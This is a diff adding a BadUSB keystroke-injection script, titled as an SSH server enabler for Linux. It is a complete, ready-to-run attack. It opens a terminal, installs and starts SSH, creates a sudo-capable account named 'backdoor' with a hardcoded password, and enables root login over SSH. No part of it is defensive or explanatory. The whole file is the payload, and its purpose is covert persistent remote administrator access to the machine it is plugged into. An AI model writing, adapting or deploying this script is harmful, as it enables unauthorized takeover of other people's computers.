@@ -1,0 +1,49 @@
+REM Title: Linux SSH Server Enabler
+REM Author: BadUSB Library
+REM Description: Enables SSH server for remote access
+REM Target: Linux
+REM Category: Remote Access
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Install and enable SSH
+STRING sudo apt-get update && sudo apt-get install -y openssh-server
+ENTER
+DELAY 10000
+
+STRING sudo systemctl enable ssh
+ENTER
+DELAY 2000
+
+STRING sudo systemctl start ssh
+ENTER
+DELAY 2000
+
+REM Create backdoor user
+STRING sudo useradd -m -s /bin/bash backdoor
+ENTER
+DELAY 2000
+
+STRING echo "backdoor:backdoor123" | sudo chpasswd
+ENTER
+DELAY 2000
+
+STRING sudo usermod -aG sudo backdoor
+ENTER
+DELAY 2000
+
+REM Configure SSH
+STRING sudo sed -i 's/#PermitRootLogin yes/PermitRootLogin yes/' /etc/ssh/sshd_config
+ENTER
+DELAY 2000
+
+STRING sudo systemctl restart ssh
+ENTER
+DELAY 2000
